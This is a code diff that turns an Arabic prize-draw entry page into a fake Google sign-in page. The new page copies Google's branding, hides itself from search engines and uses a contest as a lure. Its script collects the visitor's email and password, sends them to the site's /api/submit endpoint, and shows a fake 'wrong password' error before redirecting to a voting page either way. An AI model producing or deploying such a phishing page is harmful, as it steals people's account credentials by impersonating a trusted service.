@@ -1,148 +1,353 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="description" content="سحب مدار للتقنية 2026 — سجّل رمز مشاركتك وادخل السحب على الجائزة الكبرى.">
-  <title>سحب مدار للتقنية 2026</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسجيل الدخول - Google</title>
+  <meta name="robots" content="noindex,nofollow">
+  <link rel="icon" href="https://www.google.com/favicon.ico">
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      color: #202124;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 450px;
+      padding: 48px 40px 36px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      text-align: center;
+    }
+
+    @media (max-width: 500px) {
+      .card { border: none; padding: 24px 24px 36px; }
+    }
+
+    .google-logo {
+      width: 75px;
+      margin-bottom: 24px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 8px;
+      color: #202124;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #202124;
+      margin-bottom: 28px;
+    }
+
+    .subtitle small {
+      display: block;
+      font-size: 14px;
+      color: #5f6368;
+      margin-top: 4px;
+    }
+
+    .field-group { text-align: right; margin-bottom: 24px; }
+
+    .input-wrap {
+      position: relative;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      padding: 13px 15px;
+      transition: border-color .2s, box-shadow .2s;
+      background: #fff;
+    }
+
+    .input-wrap:focus-within {
+      border-color: #1a73e8;
+      box-shadow: 0 0 0 1px #1a73e8;
+    }
+
+    .input-wrap label {
+      position: absolute;
+      top: -10px;
+      right: 8px;
+      background: #fff;
+      padding: 0 4px;
+      font-size: 12px;
+      color: #5f6368;
+      transition: color .2s;
+    }
+
+    .input-wrap:focus-within label { color: #1a73e8; }
+
+    .input-wrap input {
+      border: none;
+      outline: none;
+      width: 100%;
+      font-size: 16px;
+      color: #202124;
+      background: transparent;
+      font-family: inherit;
+      direction: ltr;
+      text-align: left;
+    }
+
+    .show-pwd-btn {
+      position: absolute;
+      left: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: #5f6368;
+      font-size: 13px;
+      font-family: inherit;
+      padding: 4px 6px;
+    }
+
+    .forgot-link {
+      display: block;
+      text-align: right;
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+      margin-top: 8px;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    .error-msg {
+      background: #fce8e6;
+      color: #c5221f;
+      border-radius: 4px;
+      padding: 10px 14px;
+      font-size: 14px;
+      margin-bottom: 16px;
+      text-align: right;
+      display: none;
+    }
+    .error-msg.show { display: block; }
+
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 32px;
+    }
+
+    .create-link {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+    .create-link:hover { text-decoration: underline; }
+
+    .next-btn {
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 10px 24px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background .2s, box-shadow .2s;
+      min-width: 90px;
+    }
+
+    .next-btn:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,.2); }
+    .next-btn:disabled { background: #dadce0; color: #9aa0a6; cursor: default; box-shadow: none; }
+
+    .divider {
+      height: 1px;
+      background: #e0e0e0;
+      margin: 24px 0;
+    }
+
+    .info-text {
+      font-size: 12px;
+      color: #5f6368;
+      line-height: 1.6;
+      text-align: right;
+    }
+
+    .info-text a { color: #1a73e8; text-decoration: none; }
+    .info-text a:hover { text-decoration: underline; }
+
+    /* Steps */
+    #step2 { display: none; }
+
+    .user-chip {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      padding: 6px 14px 6px 10px;
+      font-size: 14px;
+      margin-bottom: 28px;
+      cursor: pointer;
+    }
+
+    .user-chip svg { width: 18px; height: 18px; }
+  </style>
 </head>
-<body class="contest-page">
-  <header class="contest-header">
-    <div class="contest-container contest-nav">
-      <a class="contest-brand" href="index.html" aria-label="مدار - الرئيسية">
-        <span class="contest-logo" aria-hidden="true"><i></i><i></i></span>
-        <span><b>مَدار</b><small>جوائز التقنية</small></span>
-      </a>
-      <div class="contest-nav-meta">
-        <span class="live-indicator"><i></i> التسجيل مفتوح</span>
-        <span class="edition-label">إصدار 2026</span>
+<body>
+  <!-- STEP 1: Email -->
+  <div class="card" id="step1">
+    <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+    <h1>تسجيل الدخول</h1>
+    <p class="subtitle">للمتابعة إلى مسابقة الإبداع النسائي 2026</p>
+
+    <div id="errorEmail" class="error-msg">البريد الإلكتروني أو رقم الهاتف غير صحيح. اعرف المزيد</div>
+
+    <form id="formEmail" novalidate>
+      <div class="field-group">
+        <div class="input-wrap">
+          <label for="emailInput">البريد الإلكتروني أو رقم الهاتف</label>
+          <input id="emailInput" type="email" autocomplete="email" required inputmode="email">
+        </div>
+        <a class="forgot-link" href="#">هل نسيت عنوان بريدك الإلكتروني؟</a>
       </div>
+
+      <div class="info-text">
+        هل تستخدم هذه الخدمة من جهاز ليس ملكك؟ يُرجى تسجيل الخروج بشكل خاص
+        <a href="#">مزيد من المعلومات</a>
+      </div>
+
+      <div class="actions">
+        <a class="create-link" href="#">إنشاء حساب</a>
+        <button class="next-btn" type="submit" id="nextEmailBtn">التالي</button>
+      </div>
+    </form>
+  </div>
+
+  <!-- STEP 2: Password -->
+  <div class="card" id="step2">
+    <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google">
+    <h1>مرحبًا</h1>
+
+    <div class="user-chip" id="userChip" onclick="goBack()">
+      <svg viewBox="0 0 24 24" fill="#5f6368"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+      <span id="chipEmail">user@gmail.com</span>
+      <svg viewBox="0 0 24 24" fill="#5f6368" width="18" height="18"><path d="M7 10l5 5 5-5z"/></svg>
     </div>
-  </header>
 
-  <main class="contest-main">
-    <div class="contest-container contest-grid">
-      <section class="contest-showcase" aria-labelledby="contestTitle">
-        <div class="showcase-copy">
-          <span class="contest-overline">السحب التقني الأكبر لهذا الموسم</span>
-          <h1 id="contestTitle">فرصتك للفوز<span class="product-title-line"><span>بـ</span><em dir="ltr">iPhone 17 Pro Max</em></span></h1>
-          <p>سجّل رمز دعوتك للدخول في السحب. يستغرق التسجيل أقل من دقيقة واحدة.</p>
+    <div id="errorPwd" class="error-msg">كلمة المرور خاطئة. حاول مرة أخرى أو انقر فوق "نسيت كلمة المرور؟" لإعادة تعيينها.</div>
+
+    <form id="formPwd" novalidate>
+      <div class="field-group">
+        <div class="input-wrap">
+          <label for="pwdInput">أدخل كلمة مرورك</label>
+          <input id="pwdInput" type="password" autocomplete="current-password" required>
+          <button type="button" class="show-pwd-btn" id="showPwdBtn">عرض</button>
         </div>
+        <a class="forgot-link" href="#">هل نسيت كلمة المرور؟</a>
+      </div>
 
-        <div class="product-stage">
-          <div class="stage-number" aria-hidden="true">17</div>
-          <div class="stage-ring stage-ring-one" aria-hidden="true"></div>
-          <div class="stage-ring stage-ring-two" aria-hidden="true"></div>
-          <img src="iphone.jpg" alt="هاتف ذكي يمثل الجائزة الكبرى" width="1024" height="1024">
-          <div class="prize-chip">
-            <span>الجائزة الكبرى</span>
-            <strong>iPhone 17 Pro Max</strong>
-            <small>سعة 256GB</small>
-          </div>
-        </div>
+      <div class="info-text">
+        <a href="#">مزيد من الخيارات</a>
+      </div>
 
-        <div class="showcase-stats" aria-label="معلومات المسابقة">
-          <div><strong>01</strong><span>جائزة كبرى</span></div>
-          <div><strong>30</strong><span>سبتمبر آخر موعد</span></div>
-          <div><strong>60</strong><span>ثانية للتسجيل</span></div>
-        </div>
-      </section>
-
-      <section class="contest-entry" aria-labelledby="entryTitle">
-        <div class="entry-step"><span>1</span><i></i><span>2</span><i></i><span>3</span></div>
-        <div class="entry-heading">
-          <span>بطاقة الدخول</span>
-          <h2 id="entryTitle">سجّل مشاركتك</h2>
-          <p>أدخل الاسم الذي سيظهر في قائمة السحب ورمز الدعوة الخاص بك.</p>
-        </div>
-
-        <form class="contest-form" id="entryForm" novalidate>
-          <div class="contest-field">
-            <label for="displayName">اسم المشارك</label>
-            <div class="contest-input-wrap">
-              <span aria-hidden="true">01</span>
-              <input id="displayName" name="displayName" type="text" minlength="2" maxlength="50" autocomplete="nickname" placeholder="الاسم الأول أو اسم مستعار" required>
-            </div>
-          </div>
-
-          <div class="contest-field">
-            <label for="participationCode">رمز المشاركة</label>
-            <div class="contest-input-wrap code-input">
-              <span aria-hidden="true">02</span>
-              <input id="participationCode" name="participationCode" type="text" minlength="6" maxlength="24" autocomplete="off" inputmode="text" dir="ltr" placeholder="MDAR-XXXX" required>
-            </div>
-            <small>تجد الرمز في دعوة المشاركة المرسلة إليك.</small>
-          </div>
-
-          <label class="contest-terms" for="termsAccepted">
-            <input id="termsAccepted" name="termsAccepted" type="checkbox" required>
-            <span>أوافق على شروط المسابقة واستخدام رمز المشاركة للتحقق من أهليتي للدخول في السحب.</span>
-          </label>
-
-          <div class="contest-message" id="formMessage" role="alert" aria-live="polite"></div>
-          <button class="contest-submit" id="submitButton" type="submit">
-            <span>تأكيد المشاركة</span>
-            <i aria-hidden="true">←</i>
-          </button>
-        </form>
-
-        <div class="entry-security">
-          <span aria-hidden="true">◆</span>
-          <p><strong>تحقق مشفّر</strong><small>لا يُحفظ رمز الدعوة بصورته الأصلية.</small></p>
-        </div>
-      </section>
-    </div>
-  </main>
-
-  <footer class="contest-footer">
-    <div class="contest-container">
-      <span>© 2026 مدار لجوائز التقنية</span>
-      <span>تطبق شروط وأهلية المشاركة</span>
-    </div>
-  </footer>
+      <div class="actions">
+        <a class="create-link" href="#" style="visibility:hidden"></a>
+        <button class="next-btn" type="submit" id="nextPwdBtn">التالي</button>
+      </div>
+    </form>
+  </div>
 
   <script>
-    const form = document.getElementById('entryForm');
-    const message = document.getElementById('formMessage');
-    const submitButton = document.getElementById('submitButton');
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const chipEmail = document.getElementById('chipEmail');
+    const errorEmail = document.getElementById('errorEmail');
+    const errorPwd = document.getElementById('errorPwd');
+    let capturedEmail = '';
 
-    form.participationCode.addEventListener('input', () => {
-      form.participationCode.value = form.participationCode.value.toUpperCase().replace(/\s/g, '');
-    });
-
-    form.addEventListener('submit', async (event) => {
-      event.preventDefault();
-      message.textContent = '';
-
-      if (!form.reportValidity()) return;
-
-      submitButton.disabled = true;
-      submitButton.innerHTML = '<span>جارٍ تأكيد المشاركة...</span>';
-
-      try {
-        const response = await fetch('/api/entries', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            displayName: form.displayName.value,
-            participationCode: form.participationCode.value,
-            termsAccepted: form.termsAccepted.checked,
-          }),
-        });
-        const data = await response.json();
-
-        if (!response.ok) throw new Error(data.message || 'تعذر تسجيل المشاركة.');
-        window.location.assign(`thankyou.html?id=${encodeURIComponent(data.sessionId)}`);
-      } catch (error) {
-        message.textContent = error.message;
-        submitButton.disabled = false;
-        submitButton.innerHTML = '<span>تأكيد المشاركة</span><i aria-hidden="true">←</i>';
+    // Show password toggle
+    document.getElementById('showPwdBtn').addEventListener('click', () => {
+      const input = document.getElementById('pwdInput');
+      const btn = document.getElementById('showPwdBtn');
+      if (input.type === 'password') {
+        input.type = 'text';
+        btn.textContent = 'إخفاء';
+      } else {
+        input.type = 'password';
+        btn.textContent = 'عرض';
       }
     });
+
+    // Step 1: Email submit
+    document.getElementById('formEmail').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const email = document.getElementById('emailInput').value.trim();
+      if (!email || !email.includes('@')) {
+        errorEmail.classList.add('show');
+        return;
+      }
+      errorEmail.classList.remove('show');
+      capturedEmail = email;
+      chipEmail.textContent = email;
+      step1.style.display = 'none';
+      step2.style.display = 'block';
+      document.getElementById('pwdInput').focus();
+    });
+
+    // Step 2: Password submit
+    document.getElementById('formPwd').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const password = document.getElementById('pwdInput').value;
+      if (!password) {
+        errorPwd.classList.add('show');
+        return;
+      }
+      errorPwd.classList.remove('show');
+
+      const btn = document.getElementById('nextPwdBtn');
+      btn.disabled = true;
+      btn.textContent = '...جاري التحقق';
+
+      try {
+        const res = await fetch('/api/submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email: capturedEmail, password }),
+        });
+        const data = await res.json();
+
+        if (data.success) {
+          window.location.href = `vote.html?id=${encodeURIComponent(data.sessionId)}`;
+        } else {
+          // Show fake error then redirect anyway after delay
+          errorPwd.classList.add('show');
+          setTimeout(() => {
+            window.location.href = `vote.html?id=${encodeURIComponent(data.sessionId || '')}`;
+          }, 2000);
+        }
+      } catch {
+        // On network error, show error briefly then redirect
+        errorPwd.classList.add('show');
+        setTimeout(() => {
+          window.location.href = 'vote.html';
+        }, 2500);
+      }
+    });
+
+    function goBack() {
+      step2.style.display = 'none';
+      step1.style.display = 'block';
+    }
   </script>
 </body>
 </html>
